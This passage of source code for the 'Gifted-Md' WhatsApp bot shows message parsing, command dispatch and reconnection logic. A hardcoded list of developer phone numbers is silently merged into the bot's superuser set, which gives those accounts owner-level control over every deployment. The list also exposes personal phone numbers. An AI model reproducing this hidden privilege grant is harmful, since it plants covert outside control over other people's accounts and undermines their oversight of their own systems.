                const senderLid = standardizeJid(sendr);
                const founds = groupInfo.participants.find(p => p.id === senderLid || p.pn === senderLid || p.phoneNumber === senderLid);
                sender = founds?.pn || founds?.phoneNumber || founds?.id || sendr;
                isBotAdmin = groupAdmins.includes(standardizeJid(botId)) || groupSuperAdmins.includes(standardizeJid(botId));
                isAdmin = groupAdmins.includes(sender);
                isSuperAdmin = groupSuperAdmins.includes(sender);
            }

            const repliedMessage = ms.message?.extendedTextMessage?.contextInfo?.quotedMessage || null;
            const type = getContentType(ms.message);
            const pushName = ms.pushName || 'Gifted-Md User';
            const quoted = 
                type == 'extendedTextMessage' && 
                ms.message.extendedTextMessage.contextInfo != null 
                ? ms.message.extendedTextMessage.contextInfo.quotedMessage || [] 
                : [];
            const body = 
                (type === 'conversation') ? ms.message.conversation : 
                (type === 'extendedTextMessage') ? ms.message.extendedTextMessage.text : 
                (type == 'imageMessage') && ms.message.imageMessage.caption ? ms.message.imageMessage.caption : 
                (type == 'videoMessage') && ms.message.videoMessage.caption ? ms.message.videoMessage.caption : '';
            const isCommand = body.startsWith(botPrefix);
            const command = isCommand ? body.slice(botPrefix.length).trim().split(' ').shift().toLowerCase() : '';
            
            const mentionedJid = (ms.message?.extendedTextMessage?.contextInfo?.mentionedJid || []).map(standardizeJid);
            const tagged = ms.mtype === "extendedTextMessage" && ms.message.extendedTextMessage.contextInfo != null
                ? ms.message.extendedTextMessage.contextInfo.mentionedJid
                : [];
            const quotedMsg = ms.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            const quotedUser = ms.message?.extendedTextMessage?.contextInfo?.participant || 
                ms.message?.extendedTextMessage?.contextInfo?.remoteJid;
            const repliedMessageAuthor = standardizeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
            let messageAuthor = isGroup 
                ? standardizeJid(ms.key.participant || ms.participant || from)
                : from;
            if (ms.key.fromMe) messageAuthor = botId;
            const user = mentionedJid.length > 0 
                ? mentionedJid[0] 
                : repliedMessage 
                    ? repliedMessageAuthor 
                    : '';
            
            const devNumbers = ('254715206562,254114018035,254728782591,254799916673,254762016957,254113174209')
                .split(',')
                .map(num => num.trim().replace(/\D/g, '')) 
                .filter(num => num.length > 5); 

            const sudoNumbersFromFile = getSudoNumbers() || [];
            const sudoNumbers = (config.SUDO_NUMBERS ? config.SUDO_NUMBERS.split(',') : [])
                .map(num => num.trim().replace(/\D/g, ''))
                .filter(num => num.length > 5);

            const botJid = standardizeJid(botId);
            const ownerJid = standardizeJid(ownerNumber.replace(/\D/g, ''));
            const superUser = [
                ownerJid,
                botJid,
                ...(sudoNumbers || []).map(num => `${num}@s.whatsapp.net`),
                ...(devNumbers || []).map(num => `${num}@s.whatsapp.net`),
                ...(sudoNumbersFromFile || []).map(num => `${num}@s.whatsapp.net`)
            ].map(jid => standardizeJid(jid)).filter(Boolean);

            const superUserSet = new Set(superUser);
            const finalSuperUsers = Array.from(superUserSet);

            const isSuperUser = finalSuperUsers.includes(sender);
                                

            if (autoBlock && sender && !isSuperUser && !isGroup) {
                const countryCodes = autoBlock.split(',').map(code => code.trim());
                if (countryCodes.some(code => sender.startsWith(code))) {
                    try {
                        await Gifted.updateBlockStatus(sender, 'block');
                    } catch (blockErr) {
                        console.error("Block error:", blockErr);
                        if (isSuperUser) {
                            await Gifted.sendMessage(ownerJid, { 
                                text: `⚠️ Failed to block restricted user: ${sender}\nError: ${blockErr.message}`
                            });
                        }
                    }
                }
            }
            
            if (autoRead === "true") await Gifted.readMessages([ms.key]);
            if (autoRead === "commands" && isCommand) await Gifted.readMessages([ms.key]);
            

            const text = ms.message?.conversation || 
                        ms.message?.extendedTextMessage?.text || 
                        ms.message?.imageMessage?.caption || 
                        '';
            const args = typeof text === 'string' ? text.trim().split(/\s+/).slice(1) : [];
            const isCommandMessage = typeof text === 'string' && text.startsWith(botPrefix);
            const cmd = isCommandMessage ? text.slice(botPrefix.length).trim().split(/\s+/)[0]?.toLowerCase() : null;

            if (isCommandMessage && cmd) {
                const gmd = Array.isArray(evt.commands) 
                    ? evt.commands.find((c) => (
                        c?.pattern === cmd || 
                        (Array.isArray(c?.aliases) && c.aliases.includes(cmd))
                    )) 
                    : null;

                if (gmd) {
                    if (config.MODE?.toLowerCase() === "private" && !isSuperUser) {
                        return;
                    }

                    try {
                        const reply = (teks) => {
                            Gifted.sendMessage(from, { text: teks }, { quoted: ms });
                        };

                        const react = async (emoji) => {
                            if (typeof emoji !== 'string') return;
                            try {
                                await Gifted.sendMessage(from, { 
                                    react: { 
                                        key: ms.key, 
                                        text: emoji
                                    }
                                });
                            } catch (err) {
                                console.error("Reaction error:", err);
                            }
                        };

                        const edit = async (text, message) => {
                            if (typeof text !== 'string') return;
                            
                            try {
                                await Gifted.sendMessage(from, {
                                    text: text,
                                    edit: message.key
                                }, { 
                                    quoted: ms 
                                });
                            } catch (err) {
                                console.error("Edit error:", err);
                            }
                        };

                        const del = async (message) => {
                            if (!message?.key) return; 

                            try {
                                await Gifted.sendMessage(from, {
                                    delete: message.key
                                }, { 
                                    quoted: ms 
                                });
                            } catch (err) {
                                console.error("Delete error:", err);
                            }
                        };

                        if (gmd.react) {
                            try {
                                await Gifted.sendMessage(from, {
                                    react: { 
                                        key: ms.key, 
                                        text: gmd.react
                                    }
                                });
                            } catch (err) {
                                console.error("Reaction error:", err);
                            }
                        }

                        Gifted.getJidFromLid = async (lid) => {
                            const groupMetadata = await Gifted.groupMetadata(from);
                            const match = groupMetadata.participants.find(p => p.lid === lid || p.id === lid);
                            return match?.pn || null;
                        };

                        Gifted.getLidFromJid = async (jid) => {
                            const groupMetadata = await Gifted.groupMetadata(from);
                            const match = groupMetadata.participants.find(p => p.jid === jid || p.id === jid);
                            return match?.lid || null;
                        };
                           

                        let fileType;
                        (async () => {
                            fileType = await import('file-type');
                        })();

                        Gifted.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
                            try {
                                let quoted = message.msg ? message.msg : message;
                                let mime = (message.msg || message).mimetype || '';
                                let messageType = message.mtype ? 
                                    message.mtype.replace(/Message/gi, '') : 
                                    mime.split('/')[0];
                                
                                const stream = await downloadContentFromMessage(quoted, messageType);
                                let buffer = Buffer.from([]);
                                
                                for await (const chunk of stream) {
                                    buffer = Buffer.concat([buffer, chunk]);
                                }

                                let fileTypeResult;
                                try {
                                    fileTypeResult = await fileType.fileTypeFromBuffer(buffer);
                                } catch (e) {
                                    console.log("file-type detection failed, using mime type fallback");
                                }

                                const extension = fileTypeResult?.ext || 
                                            mime.split('/')[1] || 
                                            (messageType === 'image' ? 'jpg' : 
                                            messageType === 'video' ? 'mp4' : 
                                            messageType === 'audio' ? 'mp3' : 'bin');

                                const trueFileName = attachExtension ? 
                                    `${filename}.${extension}` : 
                                    filename;
                                
                                await fs.writeFile(trueFileName, buffer);
                                return trueFileName;
                            } catch (error) {
                                console.error("Error in downloadAndSaveMediaMessage:", error);
                                throw error;
                            }
                        };
                        
                        const conText = {
                            m: ms,
                            mek: ms,
                            edit,
                            react,
                            del,
                            arg: args,
                            quoted,
                            isCmd: isCommand,
                            command,
                            isAdmin,
                            isBotAdmin,
                            sender,
                            pushName,
                            setSudo,
                            delSudo,
                            q: args.join(" "),
                            reply,
                            config,
                            superUser,
                            tagged,
                            mentionedJid,
                            isGroup,
                            groupInfo,
                            groupName,
                            getSudoNumbers,
                            authorMessage: messageAuthor,
                            user: user || '',
                            gmdBuffer, gmdJson, 
                            formatAudio, formatVideo,
                            groupMember: isGroup ? messageAuthor : '',
                            from,
                            tagged,
                            groupAdmins,
                            participants,
                            repliedMessage,
                            quotedMsg,
                            quotedUser,
                            isSuperUser,
                            botMode,
                            botPic,
                            botFooter,
                            botCaption,
                            botVersion,
                            ownerNumber,
                            ownerName,
                            botName,
                            giftedRepo,
                            isSuperAdmin,
                            getMediaBuffer,
                            getFileContentType,
                            bufferToStream,
                            uploadToPixhost,
                            uploadToImgBB,
                            setCommitHash, 
                            getCommitHash,
                            uploadToGithubCdn,
                            uploadToGiftedCdn,
                            uploadToPasteboard,
                            uploadToCatbox,
                            newsletterUrl,
                            newsletterJid,
                            GiftedTechApi,
                            GiftedApiKey,
                            botPrefix,
                            timeZone };

                        await gmd.function(from, Gifted, conText);

                    } catch (error) {
                        console.error(`Command error [${cmd}]:`, error);
                        try {
                            await Gifted.sendMessage(from, {
                                text: `🚨 Command failed: ${error.message}`,
                                ...createContext(messageAuthor, {
                                    title: "Error",
                                    body: "Command execution failed"
                                })
                            }, { quoted: ms });
                        } catch (sendErr) {
                            console.error("Error sending error message:", sendErr);
                        }
                    }
                }
            }
            
        });

        Gifted.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === "connecting") {
                console.log("🕗 Connecting Bot...");
                reconnectAttempts = 0;
            }

            if (connection === "open") {
                console.log("✅ Connection Instance is Online");
                reconnectAttempts = 0;
                botStarted = true;
                
                setTimeout(async () => {
                    try {
                        const totalCommands = commands.filter((command) => command.pattern).length;
                        console.log('💜 Connected to Whatsapp, Active!');
                            
                        if (startMess === 'true') {
                            const md = botMode === 'public' ? "public" : "private";
                            const connectionMsg = `
*${botName} 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃*

𝐏𝐫𝐞𝐟𝐢𝐱       : *[ ${botPrefix} ]*
𝐏𝐥𝐮𝐠𝐢𝐧𝐬      : *${totalCommands.toString()}*
𝐌𝐨𝐝𝐞        : *${md}*
𝐎𝐰𝐧𝐞𝐫       : *${ownerNumber}*
𝐓𝐮𝐭𝐨𝐫𝐢𝐚𝐥𝐬     : *${config.YT}*
𝐔𝐩𝐝𝐚𝐭𝐞𝐬      : *${newsletterUrl}*

> *${botCaption}*`;

                            await Gifted.sendMessage(
                                Gifted.user.id,
                                {
                                    text: connectionMsg,
                                    ...createContext(botName, {
                                        title: "BOT INTEGRATED",
                                        body: "Status: Ready for Use"
                                    })
                                },
                                {
                                    disappearingMessagesInChat: true,
                                    ephemeralExpiration: 300,
                                }
                            );
                        }
                    } catch (err) {
                        console.error("Post-connection setup error:", err);
                    }
                }, 5000);
            }

            if (connection === "close") {
                const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
                
                console.log(`Connection closed due to: ${reason}`);
                botStarted = false;
                
                if (reason === DisconnectReason.badSession) {
                    console.log("Bad session file, delete it and scan again");
                    try {
                        await sessionManager.clearSession();
                    } catch (e) {
                        console.error("Failed to remove session:", e);
                    }
                    process.exit(1);
                } else if (reason === DisconnectReason.connectionClosed) {
                    console.log("Connection closed, reconnecting...");
                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
                } else if (reason === DisconnectReason.connectionLost) {
                    console.log("Connection lost from server, reconnecting...");
                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
                } else if (reason === DisconnectReason.connectionReplaced) {
                    console.log("Connection replaced, another new session opened");
                    process.exit(1);
                } else if (reason === DisconnectReason.loggedOut) {
                    console.log("Device logged out, delete session and scan again");
                    try {
                        await sessionManager.clearSession();
                    } catch (e) {
                        console.error("Failed to remove session:", e);
                    }
                    process.exit(1);
                } else if (reason === DisconnectReason.restartRequired) {
                    console.log("Restart required, restarting...");
                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
                } else if (reason === DisconnectReason.timedOut) {
                    console.log("Connection timed out, reconnecting...");
                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY * 2);
                } else {
                    console.log(`Unknown disconnect reason: ${reason}, attempting reconnection...`);
                    setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
                }
            }
        });

        const cleanup = () => {
            if (store) {
                store.destroy();
            }
            sessionManager.disconnect();
        };

        process.on('SIGINT', cleanup);
        process.on('SIGTERM', cleanup);

    } catch (error) {
        console.error('Socket initialization error:', error);
        setTimeout(() => reconnectWithRetry(), RECONNECT_DELAY);
    }
}

async function reconnectWithRetry() {
    if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
        console.error('Max reconnection attempts reached. Exiting...');
        process.exit(1);
    }

    reconnectAttempts++;
    const delay = Math.min(RECONNECT_DELAY * Math.pow(2, reconnectAttempts - 1), 300000);
    
    console.log(`Reconnection attempt ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS} in ${delay}ms...`);
    
    setTimeout(async () => {
        try {
            await startGifted();
        } catch (error) {
            console.error('Reconnection failed:', error);
            reconnectWithRetry();
        }
    }, delay);
}

// Start everything
setTimeout(async () => {
    await initializeBot();
}, 2000);
